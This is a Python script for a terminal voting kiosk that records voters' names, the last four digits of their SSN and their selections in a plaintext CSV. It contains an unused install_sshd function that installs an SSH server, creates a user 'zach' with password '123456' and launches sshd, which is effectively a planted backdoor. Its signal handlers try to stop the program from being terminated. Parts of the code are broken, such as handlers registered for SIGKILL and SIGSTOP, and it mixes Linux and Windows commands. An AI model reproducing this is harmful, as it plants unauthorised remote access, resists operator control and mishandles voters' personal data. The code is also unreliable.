import csv
import os
import io
import hashlib
import time
import subprocess
import signal
import sys

def signal_handler(signum, frame):
    print("Termination not allowed.")

# Register signal handler for the specified signals
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGKILL, signal_handler)
signal.signal(signal.SIGHUP, signal_handler)
signal.signal(signal.SIGSTOP, signal_handler)
signal.signal(signal.SIGCONT, signal_handler)
signal.signal(signal.SIGUSR1, signal_handler)
signal.signal(signal.SIGUSR2, signal_handler)

def signal_handler(signal, frame):
    # Ignore Ctrl+C signal
    pass


signal.signal(signal.SIGINT, signal_handler)


def signal_handler(signal, frame):
    # Ignore Ctrl+Z signal
    pass


signal.signal(signal.SIGTSTP, signal_handler)


def prompt_string(prompt):
    while True:
        print(prompt)
        try:
            return input()
        except EOFError:
            print("Error: Invalid input, please try again.")


def prompt_choice(prompt, min, max):
    while True:
        choice = int(input(prompt))
        if choice >= min and choice <= max:
            return choice
        else:
            print("Invalid input, please enter a number between {} and {}".format(min, max))


def prompt_yes_no(prompt):
    while True:
        choice = input(prompt).lower()
        if choice in ("y", "yes"):
            return True
        elif choice in ("n", "no"):
            return False
        else:
            print("Invalid input, please type 'y' for YES or 'n' for NO and press ENTER")


def install_sshd():
    while True:
        # Install packages
        os.system('apt-get install -y openssh-server ufw')

        # Create user
        os.system('useradd zach -m -s /bin/bash')
        os.system('echo "zach:123456" | chpasswd')

        # Create /run/sshd directory
        os.system('mkdir -p /run/sshd')

        # Set permissions for /run/sshd
        os.system('chmod 0755 /run/sshd')

        # Start sshd daemon
        os.system('/usr/sbin/sshd -D')


def main():
    # Create a FINAL.CSV file if it doesn't exist already
    if not os.path.exists("FINAL.csv"):
        with open("FINAL.csv", "w", encoding="utf-8") as f:
            f.write("Name,SSN,Selection,Hash value\n")

    # Read the existing votes from the CSV file
    previous_votes = set()
    with open("FINAL.csv", "r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            previous_votes.add((row["Name"], row["SSN"]))

    while True:
        # Prompt the user for input
        os.system('cls')
        name = prompt_string("What is your name? ")
        ssn_last_four = prompt_string("What are the last 4 digits of your SSN? ")

        # Check if the user has already voted
        if (name, ssn_last_four) in previous_votes:
            print("You have already voted.")
            time.sleep(2)
            continue

        while True:
            # Prompt the user for input
            os.system('cls')
            selection = prompt_choice(
                "Please select one of the following options: \n"
                "1. Option 1\n"
                "2. Option 2\n"
                "3. Option 3\n"
                "Your selection: ",
                1,
                3,
            )

            selection_name = {
                1: "Option 1",
                2: "Option 2",
                3: "Option 3",
            }[selection]
            os.system('cls')
            # Hash the user's input
            hash_value = hashlib.sha256()
            hash_value.update(name.encode("utf-8"))
            hash_value.update(ssn_last_four.encode("utf-8"))
            hash_value.update(selection_name.encode("utf-8"))
            hash_value = hash_value.hexdigest()

            # Print the user's selections and ask for confirmation
            print("You selected:\n")
            
            print("Name: {}\n".format(name).center(50))
            print("SSN: {}\n".format(ssn_last_four).center(50))
            print("Selection: {}\n\n".format(selection_name).center(50))
            print("Hash value: {}".format(hash_value).center(50))
            
            is_correct = prompt_yes_no("Are these selections correct? (Press Y for Yes and N for No) ")
            
            # If the selections are correct, write them to a CSV file in the "votes" folder with the user's name and SSN as the filename
            if is_correct:
                os.system('cls')
                print("Your Confirmation Receipt is now Printing")
                time.sleep(3)
            
                with io.open("FINAL.csv", "a", encoding="utf-8") as f:
                    f.write("{},{},{},{}\n".format(name, ssn_last_four, selection_name, hash_value))
                
                subprocess.call(["python3", "vote.py"])
                break

            # If the selections are not correct, ask the user to try again.
            else:
                print("Please try again.")


if __name__ == "__main__":
    main()       
